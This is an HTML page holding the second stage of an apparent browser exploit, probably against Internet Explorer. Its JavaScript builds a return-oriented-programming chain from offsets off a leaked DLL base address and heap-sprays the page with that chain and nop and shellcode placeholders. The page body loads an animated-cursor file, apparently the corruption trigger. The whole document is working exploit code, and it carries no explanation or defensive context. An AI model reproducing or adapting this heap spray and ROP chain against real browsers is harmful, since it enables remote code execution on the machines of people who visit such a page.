<html>
<meta id='set'>
<script type="text/javascript">

/* 
  Stage 2 - relative rop + nop + shellcode 
*/

var hold  = document.getElementById('set');


function w2a(str) { 
 
     arr = str.split('');
     ret = '%u'+ arr[4]+arr[5]+arr[6]+arr[7]+
           '%u'+arr[0]+arr[1]+arr[2]+arr[3];
     return unescape(ret);

}


function heaps() {

  var base = parent.window.baseDll;
      base = '0x' + base.toString(16) + '0000';

  base = parseInt(base);

  CollectGarbage();

  rops = [ 
          base + 0x6c0a,
          base + 0x3A140,
          base + 0x3591F,
          base + 0x6C0A,
          base + 0x3A140, 
          base + 0x130EA,
          base + 0x6C0B, 
          base + 0x36069, 
          base + 0x36402,
          base + 0x5C30,
          base + 0x6C0A,  
          base + 0x11E05,
          base + 0x14901, 
          base + 0x5255,  
          base + 0x12174, 
          base + 0xD201,  
          base + 0x4B001,  
          base + 0xB8D7,
          base + 0xB8D8,   
          base + 0x4F87,   
          base + 0x11EB1,  
          base + 0x6C0A,
          base + 0x38C81
         ];

  var code = w2a(rops[0].toString(16)) + 
             w2a(rops[1].toString(16)) +
             w2a(rops[2].toString(16)) +
             unescape('%u4141%u4141') +
             w2a(rops[3].toString(16)) +
             w2a(rops[4].toString(16)) +
             w2a(rops[5].toString(16)) +
             w2a(rops[6].toString(16)) +
             w2a(rops[7].toString(16)) +
             unescape('%u4141%u4141') +
             unescape('%u4141%u4141') +
             unescape('%u4141%u4141') +
             w2a(rops[8].toString(16))  +
             w2a(rops[9].toString(16))  +
             w2a(rops[10].toString(16)) +
             w2a('fffffdff')          +
             w2a(rops[11].toString(16)) +
             w2a(rops[12].toString(16)) +
             w2a('ffffffff')          +
             w2a(rops[13].toString(16)) +
             w2a(rops[14].toString(16)) +
             w2a(rops[15].toString(16)) +
             w2a(rops[16].toString(16)) +
             w2a(rops[17].toString(16)) + 
             w2a(rops[18].toString(16)) +
             w2a(rops[19].toString(16)) +
             w2a('ffffffc0')          +
             w2a(rops[20].toString(16)) +
             w2a(rops[22].toString(16)) +
             w2a('90909090')          +
             w2a(rops[21].toString(16)) +
             unescape('%u0a4c%u0a0a') + 
             unescape('%ueeee%ueeee') +
             unescape('%ucccc%ucccc') +   
             unescape('%ufefe%ufefe');  

    while (code.length < 100000)
        code = code + code;

    var block = code.substr(0, 64*1024/2);

    for (i=0; i<14; i++) {
        block += code.substr(0, 64*1024/2);
    }

    block += code.substr(0, (64*1024/2)-(38/2));

    var heaps = new Array();

    for (i=0; i<120; i++) {
        heaps[i] = block.substr(0, block.length);
    }


  hold.setAttribute('skwokdowkdokwod',heaps);
}


heaps();


</script>
</meta>
<body id='expme' style="CURSOR: url('s2.ani')">


</body>
</html>